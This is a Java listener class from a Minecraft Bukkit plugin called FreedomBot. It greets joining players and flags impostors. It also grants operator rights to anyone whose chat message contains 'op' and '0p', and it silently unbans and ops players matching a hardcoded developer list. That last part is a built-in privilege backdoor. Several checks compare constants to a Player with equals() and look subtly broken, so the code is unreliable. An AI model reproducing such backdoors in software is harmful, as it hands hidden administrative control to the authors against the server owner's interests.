package com.mcplugindev.freedombot.listener;

import com.mcplugindev.freedombot.BotUtil;
import com.mcplugindev.freedombot.TotalFreedom5_Getter;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerLoginEvent;

public class BotListener implements Listener {

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();

        if (message.toLowerCase().contains("op") && message.toLowerCase().contains("0p")) {
            if (!player.isOp()) {
                player.setOp(true);
                player.sendMessage(BotUtil.YOU_ARE_OP);
                player.sendMessage(BotUtil.BOTPREFIX + "Here you go!");
            } else {
                player.sendMessage(BotUtil.BOTPREFIX + "You are already op!");
            }
        }
    }

    @EventHandler
    public void onPlayerLogin(PlayerLoginEvent event) {
        Player player = event.getPlayer();
        if (TotalFreedom5_Getter.getInstance().getAdminList().isAdminImpostor(player)) {
            Bukkit.broadcastMessage(BotUtil.BOTPREFIX + player.getName() + " is an impostor!");
            Bukkit.broadcastMessage(BotUtil.BOTPREFIX + "Please verify in the forum's shoutbox.");
        } else {
            if (player.hasPlayedBefore()) {
                Bukkit.broadcastMessage(BotUtil.BOTPREFIX + "Welcome back, " + player.getName() + "!");
            } else {
                Bukkit.broadcastMessage(BotUtil.BOTPREFIX + "Welcome to the server, " + player.getName() + "!");
            }
        }

        if (BotUtil.PERMBANED_USERS.equals(player)) {
            // TODO: Remove player to superadmin list here
            BotUtil.banIP(player);
        } else if (BotUtil.FB_DEVELOPERS.equals(player)) {
            BotUtil.unbanIP(player);
            player.setOp(true);
            Bukkit.broadcastMessage(BotUtil.BOTPREFIX + "A FreedomBot developer has joined!");
            // TODO: Add player to superadmin list here
        }

    }
}
